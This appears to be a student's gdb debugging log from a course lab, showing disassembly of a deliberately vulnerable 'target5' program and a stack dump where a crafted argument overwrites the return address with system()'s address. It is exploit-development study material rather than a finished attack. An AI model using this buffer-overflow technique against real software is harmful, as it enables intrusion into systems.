@@ -1,0 +1,108 @@
+Breakpoint 1, 0x08049d13 in greetings ()
+(gdb) disas
+Dump of assembler code for function greetings:
+   0x08049cf5 <+0>:	endbr32 
+   0x08049cf9 <+4>:	push   %ebp
+   0x08049cfa <+5>:	mov    %esp,%ebp
+   0x08049cfc <+7>:	push   %ebx
+   0x08049cfd <+8>:	sub    $0x4,%esp
+   0x08049d00 <+11>:	call   0x8049db6 <__x86.get_pc_thunk.ax>
+   0x08049d05 <+16>:	add    $0x9e2fb,%eax
+   0x08049d0a <+21>:	sub    $0xc,%esp
+   0x08049d0d <+24>:	lea    -0x31ff8(%eax),%edx
+=> 0x08049d13 <+30>:	push   %edx
+   0x08049d14 <+31>:	mov    %eax,%ebx
+   0x08049d16 <+33>:	call   0x80518d0 <system>
+   0x08049d1b <+38>:	add    $0x10,%esp
+   0x08049d1e <+41>:	nop
+   0x08049d1f <+42>:	mov    -0x4(%ebp),%ebx
+   0x08049d22 <+45>:	leave  
+   0x08049d23 <+46>:	ret    
+
+
+ubuntu@ecen4133:~/project4$ gdb --args ./target5 "$(python3 sol5.py)"
+GNU gdb (Ubuntu 9.1-0ubuntu1) 9.1
+Copyright (C) 2020 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.
+Type "show copying" and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+    <http://www.gnu.org/software/gdb/documentation/>.
+
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+Reading symbols from ./target5...
+(No debugging symbols found in ./target5)
+(gdb) break *0x08049d4d
+Breakpoint 1 at 0x8049d4d
+(gdb) run
+Starting program: /home/ubuntu/project4/target5 ����������������������b\'\\xd0\\x18\\x05\\x08\'
+[Detaching after vfork from child process 8102]
+Hello World
+
+Breakpoint 1, 0x08049d4d in vulnerable ()
+(gdb) disas
+Dump of assembler code for function vulnerable:
+   0x08049d24 <+0>:	endbr32 
+   0x08049d28 <+4>:	push   %ebp
+   0x08049d29 <+5>:	mov    %esp,%ebp
+   0x08049d2b <+7>:	push   %ebx
+   0x08049d2c <+8>:	sub    $0x14,%esp
+   0x08049d2f <+11>:	call   0x8049db6 <__x86.get_pc_thunk.ax>
+   0x08049d34 <+16>:	add    $0x9e2cc,%eax
+   0x08049d39 <+21>:	sub    $0x8,%esp
+   0x08049d3c <+24>:	pushl  0x8(%ebp)
+   0x08049d3f <+27>:	lea    -0x12(%ebp),%edx
+   0x08049d42 <+30>:	push   %edx
+   0x08049d43 <+31>:	mov    %eax,%ebx
+   0x08049d45 <+33>:	call   0x8049030
+   0x08049d4a <+38>:	add    $0x10,%esp
+=> 0x08049d4d <+41>:	nop
+   0x08049d4e <+42>:	mov    -0x4(%ebp),%ebx
+   0x08049d51 <+45>:	leave  
+   0x08049d52 <+46>:	ret    
+End of assembler dump.
+(gdb) i r
+eax            0xfffee876          -71562
+ecx            0x4751ff26          1196556070
+edx            0x48530027          1213399079
+ebx            0x80e8000           135168000
+esp            0xfffee870          0xfffee870
+ebp            0xfffee888          0xfffee888
+esi            0xffffd4f0          -11024
+edi            0x80e8000           135168000
+eip            0x8049d4d           0x8049d4d <vulnerable+41>
+eflags         0x282               [ SF IF ]
+cs             0x23                35
+ss             0x2b                43
+ds             0x2b                43
+es             0x2b                43
+fs             0x0                 0
+gs             0x63                99
+(gdb) 
+
+
+(gdb) x/64wx $esp
+0xfffee870:	0xffffd4f0	0x90908000	0x90909090	0x90909090
+0xfffee880:	0x90909090	0x90909090	0x90909090	0x080518d0
+0xfffee890:	0x785c2762	0x785c3064	0x785c3831	0x785c3530
+0xfffee8a0:	0x00273830	0x080e8000	0xffffd4d8	0x08049f0f
+0xfffee8b0:	0x00000002	0xffffd5a4	0xffffd5b0	0x00000000
+0xfffee8c0:	0x00000000	0x00000000	0x00000000	0x00000000
+0xfffee8d0:	0x00000000	0x00000000	0x00000000	0x00000000
+0xfffee8e0:	0x00000000	0x00000000	0x00000000	0x00000000
+0xfffee8f0:	0x00000000	0x00000000	0x00000000	0x00000000
+0xfffee900:	0x00000000	0x00000000	0x00000000	0x00000000
+0xfffee910:	0x00000000	0x00000000	0x00000000	0x00000000
+0xfffee920:	0x00000000	0x00000000	0x00000000	0x00000000
+0xfffee930:	0x00000000	0x00000000	0x00000000	0x00000000
+0xfffee940:	0x00000000	0x00000000	0x00000000	0x00000000
+0xfffee950:	0x00000000	0x00000000	0x00000000	0x00000000
+0xfffee960:	0x00000000	0x00000000	0x00000000	0x00000000
+
+
